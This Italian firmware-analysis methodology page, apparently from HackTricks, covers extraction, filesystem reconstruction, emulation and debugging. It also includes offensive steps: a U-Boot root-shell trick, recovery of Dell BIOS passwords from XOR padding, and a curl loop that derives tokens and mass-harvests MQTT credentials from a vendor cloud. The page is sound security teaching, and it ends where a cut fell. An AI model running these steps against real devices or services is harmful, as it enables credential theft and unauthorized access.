# Analisi del firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introduzione**

### Risorse correlate

Per acquisire dati tramite interfacce hardware esposte, consulta [Acquisizione del firmware tramite console UART](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) e [Acquisizione del contenuto della memoria flash SPI](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Per acquisire in modo ripetibile i dati UART durante l'avvio, prima di poter accedere alla console, consulta [Alimentazione controllata via SCPI e acquisizione con oscilloscopio](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Il firmware è un software essenziale che consente ai dispositivi di funzionare correttamente, gestendo e facilitando la comunicazione tra i componenti hardware e il software con cui interagiscono gli utenti. È archiviato in una memoria permanente, così il dispositivo può accedere alle istruzioni fondamentali fin dal momento dell'accensione e avviare il sistema operativo. Esaminare e, potenzialmente, modificare il firmware è un passaggio fondamentale per individuare vulnerabilità di sicurezza.<sup>[[2]](#references)[[3]](#references)</sup>

## **Raccolta di informazioni**

La **raccolta di informazioni** è un passaggio iniziale fondamentale per comprendere la composizione di un dispositivo e le tecnologie che utilizza. Questo processo prevede la raccolta di dati su:

- L'architettura della CPU e il sistema operativo in esecuzione
- Le specifiche del bootloader
- La disposizione hardware e le schede tecniche
- Le metriche della codebase e la posizione del codice sorgente
- Le librerie esterne e i tipi di licenza
- La cronologia degli aggiornamenti e le certificazioni normative
- I diagrammi dell'architettura e dei flussi
- Le valutazioni di sicurezza e le vulnerabilità individuate

A questo scopo, gli strumenti di **open-source intelligence (OSINT)** sono preziosi, così come l'analisi di eventuali componenti software open source disponibili, tramite revisioni manuali e automatizzate. Strumenti come [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) offrono analisi statica gratuite che possono essere utilizzate per individuare potenziali problemi.

## **Acquisizione del firmware**

È possibile ottenere il firmware in vari modi, ognuno con un diverso livello di complessità:

- Ottenerlo **direttamente** dalla fonte (sviluppatori, produttori)
- **Compilarlo** seguendo le istruzioni fornite
- **Scaricarlo** dai siti di supporto ufficiali
- Utilizzare query **Google dork** per trovare file del firmware ospitati online
- Accedere direttamente allo **cloud storage**, con strumenti come [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercettare gli **aggiornamenti** con tecniche man-in-the-middle
- **Estrarlo** dal dispositivo tramite connessioni come **UART**, **JTAG** o **PICit**
- **Monitorare** le richieste di aggiornamento nelle comunicazioni del dispositivo
- Individuare e utilizzare gli **endpoint di aggiornamento hardcoded**
- **Eseguire il dump** dal bootloader o dalla rete
- **Rimuovere e leggere** il chip di memoria, se tutti gli altri metodi falliscono, utilizzando gli strumenti hardware appropriati

### Log solo UART: forzare una root shell tramite l'env di U-Boot nella flash

Se gli input RX UART vengono ignorati (sono disponibili solo i log), puoi comunque forzare una shell init **modificando offline il blob dell'ambiente U-Boot**:<sup>[[6]](#references)</sup>

1. Esegui il dump della flash SPI con una clip SOIC-8 e un programmatore (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Individua la partizione env di U-Boot, modifica `bootargs` per includere `init=/bin/sh` e **ricalcola il CRC32 dell'env U-Boot** per il blob.
3. Rifai il flash solo della partizione env e riavvia; dovrebbe apparire una shell su UART.

È utile sui dispositivi embedded in cui la shell del bootloader è disabilitata, ma la partizione env è scrivibile tramite accesso a flash esterna.

## Analisi del firmware

Ora che **hai il firmware**, devi estrarne informazioni per sapere come gestirlo. Puoi usare diversi strumenti:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Se non trovi molto con questi strumenti, controlla l'**entropia** dell'immagine con `binwalk -E <bin>`; se è bassa, probabilmente non è cifrata. Se è alta, probabilmente è cifrata (o compressa in qualche modo).

Inoltre, puoi usare questi strumenti per estrarre **file incorporati nel firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oppure [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) per esaminare il file.

### Analisi differenziale della flash e archivi segreti XOR recuperabili

Quando un'impostazione del firmware non ha un formato di archiviazione documentato, acquisisci prima diverse letture corrispondenti della flash, modifica **esattamente una** impostazione, acquisisci di nuovo un dump completo del chip e confronta gli offset. Ripetere l'esperimento con valori controllati permette di distinguere l'impostazione dai contatori e dai metadati di scrittura; le modifiche in nuovi offset anziché in-place indicano un archivio append-only o strutturato come un log. Conserva le voci eliminate o contrassegnate come tombstone, perché i loro byte di payload potrebbero essere ancora recuperabili.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Dopo aver individuato la regione, estrai i moduli firmware con strumenti come `binwalk` e analizza in reverse writer/validator in Ghidra. Verifica nel codice i limiti dei campi, il padding, l’indicizzazione delle chiavi e la derivazione delle chiavi, invece di dedurre lo schema solo dai pattern del ciphertext.<sup>[[12]](#references)</sup>

#### Recuperare le chiavi dal padding a zero cifrato

Come descritto in [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), il testo in chiaro noto rivela i byte del keystream alle stesse posizioni. Un campo di dimensione fissa è particolarmente esposto quando il suo padding a zero copre tutti gli indici di una chiave XOR ripetuta: il padding cifrato rivela direttamente quei byte della chiave, perché `0x00 XOR key_byte = key_byte`. Se sono coperti tutti gli indici della chiave, ricostruisci la chiave dalla coda del ciphertext e decifra i byte contenenti dati.<sup>[[12]](#references)</sup>

Il formato vulnerabile della password BIOS DVAR di Dell è un esempio concreto: il byte `0` di un campo da 32 byte è in chiaro, mentre i byte `1..31` usano una chiave ripetuta di 20 byte.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Per una password di lunghezza `L`, le posizioni da `L` a `31` erano zero prima dello XOR. Quando `L <= 12`, queste posizioni coprono ogni indice della chiave, quindi la chiave completa e la password vengono recuperate senza brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Recuperare le chiavi dai record storici

Non analizzare ogni record in modo indipendente. La chiave DVAR è derivata approssimativamente come `modified_md5(device_seed || variable_GUID || password[0])`: il device seed e il GUID sono fissi, e l’unico input che dipende dalla password è il suo primo byte in chiaro. Questo produce al massimo 256 chiavi per dispositivo e fa sì che i record che iniziano con lo stesso byte condividano una chiave. Raggruppa i record attivi ed eliminati in base a quel byte; un breve record storico può rivelare la chiave completa tramite il padding e decifrare un record corrente più lungo, il cui padding da solo non è sufficiente. La rotazione delle password può quindi aumentare l’esposizione quando il vecchio ciphertext viene contrassegnato come eliminato invece di essere cancellato.<sup>[[12]](#references)</sup>

Lo strumento [`dellpwn`](https://github.com/R3n5k1/dellpwn) individua DVAR, convalida i record candidati, recupera le password e può mostrare i byte grezzi memorizzati e quelli della chiave. Compilalo da un checkout e analizza un’immagine flash verificata come segue:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Per i parser personalizzati, rifiuta i falsi positivi usando la struttura dei record, i vincoli sui caratteri stampabili, i controlli dello zero-padding, l'entropia della chiave e la coerenza nei punti in cui la chiave ricomincia. Se dump ripetuti mostrano pochi bit modificati per scrittura, elenca le maschere osservate e assegna un ordine alle correzioni in base a questi vincoli, ma segnala i caratteri ambigui invece di presentare un risultato euristico come un recupero esatto.<sup>[[12]](#references)</sup>

I verificatori di password dovrebbero memorizzare un hash unidirezionale iterato e salato, anziché testo cifrato reversibile, e gli archivi con struttura a log dovrebbero rimuovere in modo sicuro i dati segreti superati.<sup>[[12]](#references)</sup>

### Ottenere il filesystem

Con gli strumenti commentati in precedenza, come `binwalk -ev <bin>`, dovresti essere riuscito a **estrarre il filesystem**.\
Binwalk di solito lo estrae all'interno di una **cartella denominata in base al tipo di filesystem**, che in genere è uno dei seguenti: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Estrazione manuale del filesystem

A volte, binwalk **non ha il magic byte del filesystem nelle sue firme**. In questi casi, usa binwalk per **trovare l'offset del filesystem e ritagliare il filesystem compresso** dal binario, quindi **estrai manualmente** il filesystem in base al suo tipo seguendo i passaggi riportati di seguito.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Esegui il seguente comando **dd** per effettuare il carving del filesystem Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

In alternativa, è possibile eseguire anche il seguente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Per squashfs (usato nell'esempio precedente)

`$ unsquashfs dir.squashfs`

I file si troveranno successivamente nella directory "`squashfs-root`".

- File di archivio CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Per filesystem jffs2

`$ jefferson rootfsfile.jffs2`

- Per filesystem ubifs con flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Ricostruire filesystem root embedded suddivisi

Se un dump raw di eMMC/SSD contiene un header di filesystem valido, ma gli offset dei metadati si estendono oltre i limiti nominali della partizione, non classificarlo subito come corrotto. Il codice di avvio embedded può assemblare il dispositivo root effettivo a partire da più intervalli fisici con Device Mapper, quindi l'estrazione di una singola partizione GPT produce solo il primo segmento.<sup>[[9]](#references)</sup>

#### Esaminare l'intera immagine del supporto

Per prima cosa, verifica che l'acquisizione sia terminata, che le dimensioni siano stabili e che nessun processo di scrittura stia ancora usando l'immagine. Se il nome del file codifica un indirizzo iniziale/finale, confronta quell'intervallo con il numero effettivo di byte. Recupera la GPT in modalità di sola lettura e collega solo l'intervallo necessario; **non** eseguire `vgchange -ay` su un volume fisico non attendibile sulla workstation, perché sono possibili conflitti tra gruppi di volumi e scritture involontarie.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Preferisci una VM usa e getta quando la logica di init originale o uno stack LVM deve vedere l’intera immagine. I log di avvio storici provenienti da una partizione di avvio standard sono particolarmente utili: il bootloader potrebbe aver registrato gli offset del container proprietario, le lunghezze dei componenti, la selezione dello slot, le regole di allineamento e la verifica della firma. Usa questi valori per estrarre una command line, un kernel e un initramfs incorporati, quindi convalida ciascun output in modo indipendente con `file`, i byte magici e `binwalk`; leggere fino alla fine del container può aggiungere accidentalmente un initrd, un oggetto ACPI o una firma al kernel.<sup>[[9]](#references)</sup>

#### Recuperare la mappa dei blocchi al momento dell’avvio

Estrai l’initramfs del kernel e analizza `/init` e le eventuali librerie di storage. In [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), segui i riferimenti alle stringhe `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` e ai percorsi delle partizioni; poi traccia il codice che seleziona lo slot A/B attivo e crea la tabella. Alcuni punti di partenza utili in radare2 sono `r2 -A init`, `afl`, `pdf @ main` e `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Il target linear mappa intervalli consecutivi di un dispositivo virtuale su intervalli di uno o più dispositivi sottostanti. Una tabella recuperata con due segmenti ha spesso questa forma (tutte le posizioni e le lunghezze sono espresse in settori da 512 byte):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Riproduci esattamente l’aritmetica del codice macchina, inclusi la larghezza degli interi, gli shift e le conversioni di unità. Per esempio, la seguente espressione tronca una dimensione in byte al multiplo inferiore di 4 KiB e solo allora la converte in settori da 512 byte; sostituirla con `p4_bytes // 512` sposta la coda selezionata di `p4_bytes % 4096` ogni volta che la partizione non è allineata a una pagina.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Ricostruisci un’immagine di analisi piatta copiando gli intervalli nell’ordine della tabella, usando blocchi di dimensione limitata invece di caricare in memoria l’intero dump del supporto. In questo modo eviti anche di creare dispositivi mapper sul sistema host. Mantieni gli offset ricavati dalla GPT, i conteggi dei settori invertiti e la lunghezza risultante dell’output come asserzioni separate.<sup>[[9]](#references)</sup>

#### Distingui la corruzione da un errore costante di ricostruzione

Per SquashFS, controlla il magic `hsqs` e decodifica il campo little-endian a 64 bit `bytes_used` all’offset 40 del superblocco prima di eseguire `unsquashfs`. Se l’estrazione fallisce in diverse strutture non correlate, cerca in un’ampia finestra attorno alle posizioni attese e richiedi candidati strutturali solidi: un blocco di metadati decomprimibile, diverse voci di directory valide consecutive, campi plausibili dell’inode, un inode radice coerente con il conteggio degli inode oppure una struttura valida di metadati d’integrità. Una singola corrispondenza del magic non è sufficiente.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Quando lo stesso delta con segno rende valide strutture indipendenti, per esempio i metadati di una directory e un record verity, la causa più probabile è un errore sistematico nell’inizio del segmento, non byte mancanti. Riprendi i calcoli invertiti e cerca resti scartati, problemi di segno, overflow o arrotondamenti a settori/pagine, prima di tentare il recupero di orphan o di modificare i metadati del filesystem.<sup>[[9]](#references)</sup>

Infine, mantieni separati i confini di protezione: i volumi LUKS sigillati con TPM proteggono la riservatezza dei dati, mentre una mappatura dm-verity firmata protegge l’integrità del filesystem root. Un TPM software non recupera una chiave sigillata al TPM fisico originale, e avviare una SquashFS modificata tramite un init destinato solo alla ricerca che omette la verifica verity non falsifica la sua firma né compromette dm-verity.<sup>[[9]](#references)</sup>

## Analisi del firmware

Una volta ottenuto il firmware, è essenziale analizzarlo per comprenderne la struttura e le potenziali vulnerabilità. Questo processo prevede l’uso di vari strumenti per analizzare ed estrarre dati utili dall’immagine del firmware.

### Strumenti per l’analisi iniziale

Sono forniti alcuni comandi per l’ispezione iniziale del file binario (indicato come `<bin>`). Questi comandi aiutano a identificare i tipi di file, estrarre stringhe, analizzare dati binari e comprendere i dettagli delle partizioni e dei filesystem:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Per valutare lo stato della cifratura dell'immagine, si controlla l'**entropia** con `binwalk -E <bin>`. Una bassa entropia suggerisce l'assenza di cifratura, mentre un'alta entropia indica una possibile cifratura o compressione.

Per estrarre i **file incorporati**, si consigliano strumenti e risorse come la documentazione **file-data-carving-recovery-tools** e **binvis.io** per l'ispezione dei file.

### Estrazione del filesystem

Con `binwalk -ev <bin>`, di solito è possibile estrarre il filesystem, spesso in una directory denominata in base al tipo di filesystem (ad es. squashfs, ubifs). Tuttavia, quando **binwalk** non riesce a riconoscere il tipo di filesystem perché mancano i magic bytes, è necessario procedere all'estrazione manuale. Questa consiste nell'usare `binwalk` per individuare l'offset del filesystem e poi il comando `dd` per estrarre il filesystem:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Successivamente, a seconda del tipo di filesystem (ad es., squashfs, cpio, jffs2, ubifs), si usano comandi diversi per estrarne manualmente i contenuti.

### Analisi del filesystem

Una volta estratto il filesystem, inizia la ricerca di vulnerabilità. Si presta attenzione ai daemon di rete non sicuri, alle credenziali hardcoded, agli endpoint API, alle funzionalità dei server di aggiornamento, al codice non compilato, agli script di avvio e ai binari compilati da analizzare offline.

**Percorsi chiave** e **elementi** da esaminare includono:

- **etc/shadow** e **etc/passwd** per le credenziali degli utenti
- Certificati e chiavi SSL in **etc/ssl**
- File di configurazione e script per individuare potenziali vulnerabilità
- Binari embedded da analizzare ulteriormente
- Web server e binari comuni dei dispositivi IoT

Diversi strumenti aiutano a individuare informazioni sensibili e vulnerabilità nel filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) per cercare informazioni sensibili
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) per un'analisi completa del firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) e [**EMBA**](https://github.com/e-m-b-a/emba) per l'analisi statica e dinamica

### Controlli di sicurezza sui binari compilati

Sia il codice sorgente sia i binari compilati presenti nel filesystem devono essere esaminati per individuare vulnerabilità. Strumenti come **checksec.sh** per i binari Unix e **PESecurity** per quelli Windows aiutano a identificare i binari non protetti che potrebbero essere sfruttati.

## Recupero di configurazioni cloud e credenziali MQTT tramite token URL derivati

Molti hub IoT recuperano la configurazione specifica di ciascun dispositivo da un endpoint cloud simile a:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Durante l'analisi del firmware potresti scoprire che `<token>` viene derivato localmente dall'ID del dispositivo usando un segreto hardcoded, ad esempio:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Questo design consente a chiunque conosca un deviceId e la STATIC_KEY di ricostruire l'URL e recuperare la configurazione cloud, che spesso rivela credenziali MQTT in testo semplice e prefissi dei topic.

Procedura pratica:

1) Estrai il deviceId dai log di avvio UART

- Collega un adattatore UART a 3.3V (TX/RX/GND) e acquisisci i log:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Cerca le righe che stampano il pattern dell'URL di configurazione cloud e l'indirizzo del broker, ad esempio:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Recupera STATIC_KEY e l'algoritmo del token dal firmware

- Carica i binari in Ghidra/radare2 e cerca il percorso di configurazione ("/pf/") o l'uso di MD5.
- Conferma l'algoritmo (ad es., MD5(deviceId||STATIC_KEY)).
- Deriva il token in Bash e converti il digest in maiuscolo:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Raccogliere la configurazione cloud e le credenziali MQTT

- Componi l'URL e scarica il JSON con curl; analizzalo con jq per estrarre i segreti:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Abusa di MQTT in chiaro e di ACL deboli sui topic (se presenti)

- Usa le credenziali recuperate per iscriverti ai topic di manutenzione e cercare eventi sensibili:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumerare ID di dispositivi prevedibili (su larga scala, con autorizzazione)

- Molti ecosistemi incorporano byte relativi a OUI, prodotto e tipo del vendor, seguiti da un suffisso sequenziale.
- Puoi iterare gli ID candidati, ricavare token e recuperare le configurazioni in modo programmatico:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Note
- Ottieni sempre un'autorizzazione esplicita prima di tentare un'enumerazione massiva.
- Quando possibile, preferisci l'emulazione o l'analisi statica per recuperare i segreti senza modificare l'hardware target.


Il processo di emulazione del firmware consente di eseguire **analisi dinamiche** del funzionamento di un dispositivo o di un singolo programma. Questo approccio può presentare difficoltà legate alle dipendenze dall'hardware o dall'architettura, ma trasferire il filesystem root o specifici file binari su un dispositivo con architettura e ordine dei byte corrispondenti, come un Raspberry Pi, o su una macchina virtuale preconfigurata può agevolare ulteriori test.

### Emulazione di singoli file binari

Per esaminare singoli programmi, è fondamentale identificarne l'ordine dei byte e l'architettura della CPU.

#### Esempio con architettura MIPS

Per emulare un file binario con architettura MIPS, si può usare il comando:

```bash
file ./squashfs-root/bin/busybox
```

E per installare gli strumenti di emulazione necessari:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Per MIPS (big-endian) si usa `qemu-mips`, mentre per i binari little-endian si sceglie `qemu-mipsel`.

#### Emulazione dell'architettura ARM

Per i binari ARM, il processo è simile: per l'emulazione si utilizza l'emulatore `qemu-arm`.

### Emulazione completa del sistema

Strumenti come [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) e altri permettono di emulare il firmware completo, automatizzando il processo e agevolando l'analisi dinamica.

### Ricostruire filesystem root suddivisi e verificati per l'emulazione

Se un superblocco SquashFS è leggibile, ma gli offset delle tabelle inode, directory o fragment sono impossibili, non modificare subito `unsquashfs`. Analizza il binario di avvio iniziale e riproduci il grafo dei dispositivi a blocchi che crea: i sistemi embedded possono esporre una partizione root nominale, ma creare il filesystem effettivo con una mappatura `dm-linear` che aggiunge settori presi in prestito da un'altra partizione. I controlli limitati al superblocco possono riuscire anche se tutti i successivi blocchi di metadati sono spostati.<sup>[[11]](#references)</sup>

Mantieni esattamente l'aritmetica del firmware. In particolare, determina se le lunghezze sono espresse in byte, settori da 512 byte o pagine da 4 KiB; riproduci shift e troncamenti nell'ordine originale; e tieni conto delle regioni finali dipendenti dal banco nelle configurazioni A/B. Per esempio, `(partition_bytes >> 12) << 3` prima tronca a un confine di 4 KiB e solo dopo esprime il risultato in settori da 512 byte; sostituirlo con `partition_bytes // 512` può spostare di alcuni kilobyte l'estensione aggiunta e danneggiare tutte le tabelle SquashFS successive.<sup>[[11]](#references)</sup>

Un flusso di convalida utile è:<sup>[[11]](#references)</sup>

1. Ricava dal binario del verificatore/init il dispositivo sorgente, il settore iniziale e la lunghezza di ogni segmento `dm-linear`.
2. Concatena o mappa le estensioni senza modificarne le regole di allineamento.
3. Se l'estrazione continua a non riuscire, cerca solo in una piccola finestra attorno al confine previsto e richiedi diverse strutture di metadati valide consecutive, invece di accettare un superblocco che sembra plausibile.
4. Esegui `unsquashfs` non modificato sull'immagine ricostruita; l'attraversamento riuscito di tutte le directory e i fragment è una prova più solida di `unsquashfs -stat`.

#### Sostituzione di dm-verity controllata dall'analista

Quando l'analista controlla il kernel QEMU, l'initramfs e i dischi virtuali, è possibile avviare una root modificata sostituendo il PID 1 di verifica del produttore con un piccolo init collegato staticamente. Si tratta di una **sostituzione della catena di avvio in laboratorio**, non di una violazione di dm-verity, della sua firma RSA, di Secure Boot o di una chiave sigillata a un TPM.<sup>[[11]](#references)</sup>

L'init sostitutivo dovrebbe riprodurre le parti operative del percorso di avvio originale: montare `devtmpfs`, chiamare `setsid()`, collegare `/dev/console` ai file descriptor 0–2, montare `/proc` e `/sys`, attendere il dispositivo a blocchi fornito, montare la root modificata in sola lettura, scollegare i pseudo-filesystem della vecchia root, spostare il nuovo mount su `/`, eseguire `chroot` e `execve()` dell'`/sbin/init` originale del firmware. Scollegare `/dev`, `/proc` e `/sys` **prima** di `MS_MOVE` evita di scollegare accidentalmente i punti di mount appartenenti alla nuova root.<sup>[[11]](#references)</sup>

Mantieni lo stato modificabile del dispositivo separato dalla root immutabile modificata. Un overlay qcow2 può preservare lo stato LVM del disco originale mentre un secondo disco virtio in sola lettura fornisce SquashFS modificato:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Debug dell’immagine offline

Esamina lo stato persistente al di fuori del guest quando avvii lenti, script di avvio distruttivi o log della console inaffidabili rendono difficile individuare il problema. Non collegare mai un overlay usato da una VM in esecuzione; esponilo con `qemu-nbd`, limita il rilevamento di LVM alla partizione NBD prevista e disattiva il gruppo di volumi prima di disconnetterlo.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Per un’isolazione dei guasti ripetibile, scrivi file marker con timestamp su un volume stabile e scrivibile e verificali offline; `/dev/kmsg`, le FIFO e le console temporanee possono produrre falsi negativi a causa della limitazione della frequenza o dell’arresto prematuro del processo. Inoltre, confronta le interfacce esatte tra i vari livelli prima di modificare codice non correlato: `uname -r` rispetto a `/lib/modules/`, le funzionalità ext4 su disco rispetto alla configurazione del kernel e la generazione di `libGL` di Mesa rispetto all’ABI del driver DRI e ai nomi dei driver derivati dal PCI. Un componente può esistere e persino caricarsi correttamente con `dlopen()`, ma restare inutilizzabile perché il consumer si aspetta un’ABI diversa.<sup>[[11]](#references)</sup>

## Analisi dinamica nella pratica

In questa fase, per l’analisi si utilizza un ambiente con dispositivo reale o emulato. È essenziale mantenere l’accesso alla shell e al filesystem del sistema operativo. L’emulazione potrebbe non riprodurre perfettamente le interazioni hardware, rendendo talvolta necessario riavviarla. L’analisi dovrebbe esaminare di nuovo il filesystem, sfruttare le pagine web e i servizi di rete esposti e analizzare le vulnerabilità del bootloader. I test di integrità del firmware sono fondamentali per identificare potenziali vulnerabilità dovute a backdoor.

## Tecniche di analisi runtime

L’analisi runtime consiste nell’interagire con un processo o un binario nel suo ambiente operativo, usando strumenti come gdb-multiarch, Frida e Ghidra per impostare breakpoint e individuare vulnerabilità tramite fuzzing e altre tecniche.

Per i target embedded senza un debugger completo, **copia sul dispositivo un `gdbserver` collegato staticamente** e connettiti da remoto:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mappatura dei messaggi Zigbee / radio-co-processor

Negli hub IoT lo stack RF è spesso suddiviso tra un **radio MCU** e un processo Linux userland. Un workflow utile consiste nel mappare il percorso:<sup>[[8]](#references)</sup>

1. **RF frame** via etere
2. **parser lato controller** sul radio MCU
3. **protocollo seriale/UART testuale o TLV** inoltrato a Linux (ad esempio `/dev/tty*`)
4. **dispatcher dell'applicazione** nel daemon principale
5. **handler specifico del protocollo / state machine**

Questa architettura crea due target di reverse engineering anziché uno. Se il controller converte i frame radio binari in un protocollo testuale come `Group,Command,arg1,arg2,...`, ricostruisci:

- I **gruppi di messaggi** e le tabelle di dispatch
- Quali messaggi possono provenire dalla **rete** e quali dal controller stesso
- Gli esatti **campi discriminatori specifici del produttore** (ad esempio Zigbee `manufacturer_code` e `cluster_command` personalizzato)
- Quali handler sono raggiungibili solo durante le fasi di **commissioning**, discovery o download di firmware/modelli

In particolare per Zigbee, acquisisci il traffico di pairing e verifica se il target si affida ancora alla **Link Key** predefinita `ZigBeeAlliance09`. In tal caso, lo sniffing del traffico di commissioning potrebbe esporre la **Network Key**. I codici di installazione di Zigbee 3.0 riducono questa esposizione: verifica quindi se il dispositivo testato li applica davvero.

### Handler di protocollo specifici del produttore e raggiungibilità vincolata dalla FSM

I comandi Zigbee/ZCL specifici del produttore sono spesso un target migliore dei cluster standardizzati, perché alimentano **codice di parsing personalizzato** e **FSM** interne con validazioni meno collaudate.<sup>[[8]](#references)</sup>

Workflow pratico:

